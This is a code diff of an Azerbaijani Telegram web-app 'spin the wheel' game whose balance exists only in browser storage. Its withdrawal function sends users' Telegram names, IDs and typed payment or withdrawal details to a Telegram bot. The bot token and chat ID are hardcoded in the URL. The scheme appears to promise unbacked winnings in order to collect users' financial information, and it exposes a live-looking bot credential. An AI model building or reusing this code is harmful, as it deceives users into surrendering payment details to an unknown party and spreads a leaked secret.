@@ -77,7 +77,7 @@
   <button class="btn" onclick="showBalance()">Balans</button>
 
   <div id="withdrawPopup">
-    <p>Çıxarış üçün yöntəm yazıb göndərin, yoxlanıldıqdan sonra təsdiqlənəcəkdir.</p>
+    <p>Çıxarış üçün yöntəm yazıb <strong>GÖNDƏR</strong> düyməsinə basın. Yoxlanıldıqdan sonra təsdiqlənəcəkdir.</p>
     <input type="text" id="withdrawMethod" placeholder="Çıxarış yöntəmini yazın" />
     <br>
     <button class="btn" onclick="submitWithdraw()">GÖNDƏR</button>
@@ -115,7 +115,6 @@
       }
     }
     drawWheel();
-    updateSpinText();
 
     function updateSpinText() {
       document.getElementById("spinCounter").innerText = `${spinCount}/50`;
@@ -148,7 +147,6 @@
       const angle = 360 * 5 + (360 / prizes.length) * index;
       wheelCanvas.style.transition = "transform 4s ease-out";
       wheelCanvas.style.transform = `rotate(${angle}deg)`;
-
       setTimeout(() => {
         const reward = prizes[index];
         balance += reward;
@@ -161,29 +159,42 @@
     }
 
     function showWithdraw() {
-      document.getElementById("withdrawPopup").style.display = "block";
+  if (balance < 3) {
+    alert("Minimum çıxarış məbləği 3 AZN-dir.");
+    return;
+  }
+  document.getElementById("withdrawPopup").style.display = "block";
     }
-
     function submitWithdraw() {
       const method = document.getElementById("withdrawMethod").value;
       if (!method) return alert("Zəhmət olmasa çıxarış yöntəmini daxil edin.");
 
-      const tg = window.Telegram.WebApp.initDataUnsafe?.user;
-      const msg = `✉️ Çıxarış sorğusu:%0AAd: ${tg?.first_name || 'Naməlum'}%0AID: ${tg?.id || 'Naməlum'}%0AYöntəm: ${method}%0AMəbləğ: ${balance.toFixed(2)} AZN`;
+      const tg = window.Telegram?.WebApp?.initDataUnsafe?.user || {};
+      const name = encodeURIComponent(tg.first_name || 'Naməlum');
+      const id = encodeURIComponent(tg.id || 'Naməlum');
+      const text = encodeURIComponent(method);
+      const amount = balance.toFixed(2);
 
-      fetch(`https://api.telegram.org/bot8133472449:AAHtl4g78JW2Jx5uw3Pxgn5TCXdVQTO9lMI/sendMessage?chat_id=8197921729&text=${msg}`)
+      const message = `✉️ Çıxarış sorğusu:%0AAd: ${name}%0AID: ${id}%0AYöntəm: ${text}%0AMəbləğ: ${amount} AZN`;
+
+      fetch(`https://api.telegram.org/bot8133472449:AAHtl4g78JW2Jx5uw3Pxgn5TCXdVQTO9lMI/sendMessage?chat_id=8197921729&text=${message}`)
         .then(res => res.json())
         .then(() => {
           alert("Çıxarış göndərildi!");
           balance = 0;
           localStorage.setItem('balance', '0');
           document.getElementById("withdrawPopup").style.display = "none";
+        })
+        .catch(() => {
+          alert("Mesaj göndərilə bilmədi. Zəhmət olmasa bir daha yoxlayın.");
         });
     }
 
     function showBalance() {
       alert(`Balans: ${balance.toFixed(5)} AZN`);
     }
+
+    updateSpinText();
   </script>
 </body>
 </html>
